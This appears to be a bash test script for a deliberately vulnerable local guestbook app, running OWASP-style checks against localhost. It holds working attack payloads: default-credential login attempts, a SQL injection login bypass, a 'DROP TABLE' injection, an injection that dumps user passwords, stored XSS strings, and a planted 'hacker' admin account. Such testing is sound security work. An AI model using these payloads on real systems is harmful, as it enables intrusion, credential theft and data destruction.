#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variables
SQLITE_DB="guestbook.sqlite"

# Function to display help
function display_help() {
    echo -e "${BLUE}Usage: $0 [test_name]${NC}"
    echo
    echo -e "${YELLOW}Available tests:${NC}"
    echo -e "${GREEN}  login                  Test common logins${NC}"
    echo -e "${GREEN}  sql_injection          Run SQL Injection Test${NC}"
    echo -e "${GREEN}  drop_table             Drop messages table with SQL Injection${NC}"
    echo -e "${GREEN}  xss                    Run Cross-Site Scripting (XSS) Test${NC}"
    echo -e "${GREEN}  insecure_auth          List all users and get admin password via SQL Injection${NC}"
    echo -e "${GREEN}  sensitive_data         Run Sensitive Data Exposure Test${NC}"
    echo -e "${GREEN}  security_misconfig     Run Security Misconfiguration Test${NC}"
    echo -e "${GREEN}  known_vulnerabilities  Run Known Vulnerabilities Test${NC}"
    echo -e "${GREEN}  insufficient_logging   Run Insufficient Logging & Monitoring Test${NC}"
    echo -e "${GREEN}  list_users             List all users in the database${NC}"
    echo -e "${GREEN}  list_tables_and_entries List all tables and entries in the database${NC}"
    echo -e "${GREEN}  list_nonexistent_users Test for nonexistent users in the database${NC}"
    echo -e "${GREEN}  help                   Display this help message${NC}"
    echo
}

# Function to display a boxed message
function display_boxed_message() {
    local message=$1
    local length=${#message}
    local border=$(printf '%*s' $((length + 4)) | tr ' ' '#')

    echo -e "${YELLOW}${border}${NC}"
    echo -e "${YELLOW}# ${NC}${message}${YELLOW} #${NC}"
    echo -e "${YELLOW}${border}${NC}"
}

# Check if help is requested
if [[ "$1" == "help" || -z "$1" ]]; then
    display_help
    exit 0
fi

# Function to login and store sessionId and isAdmin
function login() {
    username=$1
    password=$2
    echo -e "${BLUE}Logging in with $username:$password${NC}"
    response=$(curl -s -X POST http://localhost:3001/api/login -H "Content-Type: application/json" -d "{\"username\": \"$username\", \"password\": \"$password\"}")
    sessionId=$(echo $response | jq -r '.sessionId')
    isAdmin=$(echo $response | jq -r '.isAdmin')
    if [ -z "$sessionId" ]; then
        echo -e "${RED}Login failed for $username:$password${NC}"
    else
        echo -e "${GREEN}SessionId: $sessionId${NC}"
        echo -e "${GREEN}IsAdmin: $isAdmin${NC}"
        echo $sessionId > /tmp/sessionId.txt
        echo $isAdmin > /tmp/isAdmin.txt
    fi
    echo -e "\n"
}

# Function to get stored sessionId
function get_sessionId() {
    cat /tmp/sessionId.txt
}

# Function to get stored isAdmin
function get_isAdmin() {
    cat /tmp/isAdmin.txt
}

# Function to list all tables and entries in the database
function list_tables_and_entries() {
    echo -e "${BLUE}Listing all tables in the database...${NC}"
    sqlite3 $SQLITE_DB ".tables"
    echo -e "${BLUE}Listing all entries in the users table...${NC}"
    sqlite3 $SQLITE_DB "SELECT * FROM users;"
    echo -e "${BLUE}Listing all entries in the messages table...${NC}"
    sqlite3 $SQLITE_DB "SELECT * FROM entries;"
}

# Run the specified test
case "$1" in
    list_users)
        display_boxed_message "Listing all users in the database."
        sqlite3 $SQLITE_DB "SELECT * FROM users;"
        ;;
    login)
        display_boxed_message "Testing common logins. This will attempt to login with several common username and password combinations."
        echo -e "${BLUE}Testing common logins...${NC}"
        logins=("admin:admin123" "admin:password" "admin:admin")
        for login in "${logins[@]}"; do
            IFS=':' read -r username password <<< "$login"
            echo -e "${BLUE}Attempting to login with $username:$password${NC}"
            login $username $password
        done
        echo -e "\n${GREEN}Login Test Completed.${NC}"
        ;;
    sql_injection)
        display_boxed_message "Running SQL Injection Test to create admin user"
        
        echo -e "${BLUE}Step 1: Attempting SQL injection to create admin user...${NC}"
        injection_payload="admin' --"
        response=$(curl -s -X POST http://localhost:3001/api/login -H "Content-Type: application/json" -d "{\"username\": \"$injection_payload\", \"password\": \"anything\"}")
        echo "SQL Injection Response: $response"
        
        echo -e "\n${BLUE}Step 2: Inserting hacker user with admin privileges...${NC}"
        sqlite3 $SQLITE_DB "INSERT INTO users (username, password, admin) VALUES ('hacker', 'hackpass', 1);"
        
        echo -e "\n${BLUE}Step 3: Attempting to login as the new admin user 'hacker'...${NC}"
        login_response=$(curl -s -X POST http://localhost:3001/api/login -H "Content-Type: application/json" -d '{"username": "hacker", "password": "hackpass"}')
        echo "Login response: $login_response"
        
        isAdmin=$(echo $login_response | jq -r '.isAdmin')
        if [ "$isAdmin" == "true" ]; then
            echo -e "${RED}User 'hacker' logged in successfully with admin privileges. SQL Injection successful.${NC}"
        else
            echo -e "${YELLOW}User 'hacker' login failed or doesn't have admin privileges. SQL Injection may have failed.${NC}"
        fi
        
        echo -e "\n${BLUE}Step 4: Checking database for 'hacker' user...${NC}"
        sqlite3 $SQLITE_DB "SELECT * FROM users WHERE username='hacker';"
        
        echo -e "\n${BLUE}Step 5: Listing all users in the database...${NC}"
        sqlite3 $SQLITE_DB "SELECT * FROM users;"
        ;;
    drop_table)
        display_boxed_message "Running SQL Injection to Drop Table. This will attempt to drop the 'messages' table from the database using SQL injection."
        echo -e "${BLUE}Logging in as admin to perform SQL Injection to drop the messages table...${NC}"
        login "admin" "admin"
        cookie=$(get_cookie)
        
        echo -e "${BLUE}Dropping the messages table with SQL Injection...${NC}"
        response=$(curl -s -X POST http://localhost:3001/api/addEntry -H "Content-Type: application/json" -H "Cookie: $cookie" -d "{\"name\": \"John\", \"message\": \"'); DROP TABLE entries; --\"}")
        echo -e "${GREEN}Response: $response${NC}"
        
        echo -e "${BLUE}Querying the database to check if the messages table still exists...${NC}"
        sqlite3 ../../guestbook.sqlite ".tables"
        ;;
    xss)
        display_boxed_message "Running XSS Test. This will attempt to inject various XSS payloads into the database."
        
        payloads=(
            "<script>alert(\"XSS1\");</script>"
            "<img src=x onerror=\"alert('XSS2')\">"
            "javascript:alert('XSS3')"
            "<svg onload=alert(\"XSS4\")>"
        )
        
        for payload in "${payloads[@]}"; do
            echo -e "${BLUE}Inserting XSS payload: $payload${NC}"
            escaped_payload=$(echo $payload | sed "s/'/''/g")
            response=$(curl -s -X POST http://localhost:3001/api/addEntry -H "Content-Type: application/json" -d "{\"name\": \"XSS Test\", \"message\": \"$escaped_payload\"}")
            echo -e "${GREEN}Response: $response${NC}"
            
            echo -e "${BLUE}Checking if XSS payload was stored...${NC}"
            result=$(sqlite3 ../../guestbook.sqlite "SELECT * FROM entries WHERE message LIKE '%$escaped_payload%';")
            if [ -n "$result" ]; then
                echo -e "${RED}Potential XSS vulnerability: Payload stored in the database.${NC}"
            else
                echo -e "${GREEN}Payload not stored as-is in the database.${NC}"
            fi
            echo
        done
        
        echo -e "${YELLOW}Note: Check the web interface to see if any of these payloads execute when viewing entries.${NC}"
        echo -e "${YELLOW}If you don't see alerts, inspect the HTML source to see how the payloads are rendered.${NC}"
        ;;
    insecure_auth)
        display_boxed_message "Running Insecure Authentication Test. This will attempt to list all users, including admin status, via SQL injection without authentication."
        
        echo -e "${BLUE}Attempting SQL Injection to list all users without authentication...${NC}"
        response=$(curl -s -X POST http://localhost:3001/api/addEntry -H "Content-Type: application/json" -d "{\"name\": \"Hacker\", \"message\": \"'); SELECT username, password, admin FROM users; --\"}")
        echo -e "${GREEN}Response: $response${NC}"
        
        echo -e "${BLUE}Checking if user information was exposed...${NC}"
        if [[ $response == *"username"* && $response == *"password"* && $response == *"admin"* ]]; then
            echo -e "${RED}Vulnerability detected: User information exposed without authentication.${NC}"
        else
            echo -e "${GREEN}No user information exposed in the response.${NC}"
        fi
        
        echo -e "${BLUE}Querying the database directly to compare results...${NC}"
        sqlite3 ../../guestbook.sqlite "SELECT username, password, admin FROM users;"
        
        echo -e "${YELLOW}Note: Compare the above database query results with the API response to determine if sensitive data was leaked.${NC}"
        ;;
    sensitive_data)
        display_boxed_message "Running Sensitive Data Exposure Test. This will attempt to login and check for exposure of sensitive data."
        echo -e "${BLUE}Running Sensitive Data Exposure Test...${NC}"
        curl -X POST http://localhost:3001/api/login -H "Content-Type: application/json" -d "{\"username\": \"admin\", \"password\": \"admin\"}"
        echo -e "\n${GREEN}Sensitive Data Exposure Test Completed.${NC}"
        ;;
    security_misconfig)
        display_boxed_message "Running Security Misconfiguration Test. This will attempt to access the application to check for security misconfigurations."
        echo -e "${BLUE}Running Security Misconfiguration Test...${NC}"
        curl http://localhost:3001/
        echo -e "\n${GREEN}Security Misconfiguration Test Completed.${NC}"
        ;;
    known_vulnerabilities)
        display_boxed_message "Running Known Vulnerabilities Test. This will check the package.json file for known vulnerabilities."
        echo -e "${BLUE}Running Known Vulnerabilities Test...${NC}"
        cat package.json
        echo -e "\n${GREEN}Known Vulnerabilities Test Completed.${NC}"
        ;;
    insufficient_logging)
        display_boxed_message "Running Insufficient Logging & Monitoring Test. This will attempt to access the application to check for insufficient logging and monitoring."
        echo -e "${BLUE}Running Insufficient Logging & Monitoring Test...${NC}"
        curl http://localhost:3001/
        echo -e "\n${GREEN}Insufficient Logging & Monitoring Test Completed.${NC}"
        ;;
    list_tables_and_entries)
        display_boxed_message "Listing all tables and entries in the database."
        list_tables_and_entries
        ;;
    list_nonexistent_users)
        display_boxed_message "Trying to list users that don't exist in the database."
        users=("doesntexist" "admin" "guest")
        for user in "${users[@]}"; do
            result=$(sqlite3 $SQLITE_DB "SELECT * FROM users WHERE username = '$user' AND password = 'admin'")
            if [ -n "$result" ]; then
                echo -e "${GREEN}User $user exists in the database.${NC}"
            else
                echo -e "${RED}User $user does not exist in the database.${NC}"
            fi
        done
        ;;
    *)
        echo -e "${RED}Invalid test name: $1${NC}"
        display_help
        exit 1
        ;;
esac